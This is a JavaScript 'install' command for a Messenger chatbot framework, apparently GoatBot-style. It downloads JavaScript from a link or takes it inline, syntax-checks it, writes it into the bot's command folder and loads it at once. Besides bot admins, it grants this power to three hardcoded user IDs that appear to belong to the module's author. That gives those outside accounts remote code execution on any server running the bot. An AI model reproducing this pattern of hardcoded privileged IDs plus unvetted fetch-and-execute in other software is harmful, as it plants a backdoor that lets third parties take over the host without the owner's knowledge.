
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const vm = require("vm");

module.exports.config = {
  name: "install",
  version: "2.0.1",
  hasPermission: 2,
  credits: "ARIYAN SABBIR",
  usePrefix: true,
  description: "Install/Overwrite JS file + Auto Reload + Permission Lock",
  commandCategory: "utility",
  usages: "[file name] [link/code]",
  cooldowns: 5
};

module.exports.run = async function ({ api, event, args }) {
  try {
    const allowedUsers = [
      "100028959431665",
      "100081154414466",
      "61591654275272"
    ];

    const isAllowed = allowedUsers.includes(String(event.senderID));
    const isAdmin = (global.config.ADMINBOT || [])
      .map(String)
      .includes(String(event.senderID));

    if (!isAllowed && !isAdmin) {
      return api.sendMessage(
        "╔══════════════════════╗\n" +
        "❌ শুধুমাত্র বট অ্যাডমিন ও নির্দিষ্ট ৩ জন ইউজার install করতে পারবে!\n" +
        "👑 ARIYAN SABBIR\n" +
        "╚══════════════════════╝",
        event.threadID,
        event.messageID
      );
    }

    const fileName = args[0];
    const source = args.slice(1).join(" ");

    if (!fileName || !source) {
      return api.sendMessage(
        "╔══════════════════════╗\n⚠️ ফাইল নাম + কোড/লিংক দিন!\n╚══════════════════════╝",
        event.threadID,
        event.messageID
      );
    }

    if (
      fileName.includes("..") ||
      path.isAbsolute(fileName) ||
      !/^[a-zA-Z0-9_-]+\.js$/.test(fileName)
    ) {
      return api.sendMessage(
        "╔══════════════════════╗\n❌ অবৈধ ফাইল নাম!\n╚══════════════════════╝",
        event.threadID,
        event.messageID
      );
    }

    let code;

    if (/^https?:\/\/\S+$/.test(source)) {
      const response = await axios.get(source, {
        timeout: 15000,
        responseType: "text"
      });
      code = response.data;
    } else {
      code = source;
    }

    if (typeof code !== "string" || !code.trim()) {
      return api.sendMessage(
        "❌ কোনো JavaScript কোড পাওয়া যায়নি!",
        event.threadID,
        event.messageID
      );
    }

    // Syntax check only; this does not guarantee code safety.
    try {
      new vm.Script(code);
    } catch (error) {
      return api.sendMessage(
        "╔══════════════════════╗\n❌ Syntax Error:\n" +
        error.message +
        "\n╚══════════════════════╝",
        event.threadID,
        event.messageID
      );
    }

    const filePath = path.join(__dirname, fileName);
    const isUpdate = fs.existsSync(filePath);

    // Save the file only after syntax validation.
    fs.writeFileSync(filePath, code, "utf8");

    let commandName = fileName.replace(/\.js$/, "");
    let displayName = commandName;

    try {
      const resolvedPath = require.resolve(filePath);
      delete require.cache[resolvedPath];

      const newCommand = require(resolvedPath);

      if (!newCommand || !newCommand.config) {
        throw new Error("Invalid command module");
      }

      commandName = newCommand.config.name || commandName;
      displayName = commandName;

      if (
        global.GoatBot &&
        global.GoatBot.commands &&
        typeof global.GoatBot.commands.set === "function"
      ) {
        global.GoatBot.commands.set(commandName, newCommand);
      } else {
        throw new Error("GoatBot command registry not found");
      }
    } catch (error) {
      return api.sendMessage(
        "⚠️ ফাইল সেভ হয়েছে, কিন্তু reload করা যায়নি!\n" +
        error.message +
        "\nফাইল: " + fileName,
        event.threadID,
        event.messageID
      );
    }

    let installerName = "Unknown";

    try {
      const userInfo = await api.getUserInfo(event.senderID);
      installerName =
        userInfo[event.senderID]?.name || "Unknown";
    } catch (_) {}

    return api.sendMessage(
      "╔══════════════════════╗\n" +
      (isUpdate
        ? "♻️ ফাইল আপডেট হয়েছে!\n"
        : "✅ নতুন ফাইল তৈরি হয়েছে!\n") +
      "📂 " + fileName + "\n" +
      "👤 ইনস্টল করেছেন: " + installerName + "\n" +
      "👑 ARIYAN SABBIR\n" +
      "⚙️ v" + module.exports.config.version + "\n" +
      "╚══════════════════════╝\n\n" +
      "       ARIYAN SABBIR\n" +
      "╚══════════════════════╝",
      event.threadID,
      event.messageID
    );

  } catch (error) {
    console.error("ARIYAN INSTALL ERROR:", error);

    return api.sendMessage(
      "╔══════════════════════╗\n❌ Unexpected Error!\n╚══════════════════════╝",
      event.threadID,
      event.messageID
    );
  }
};
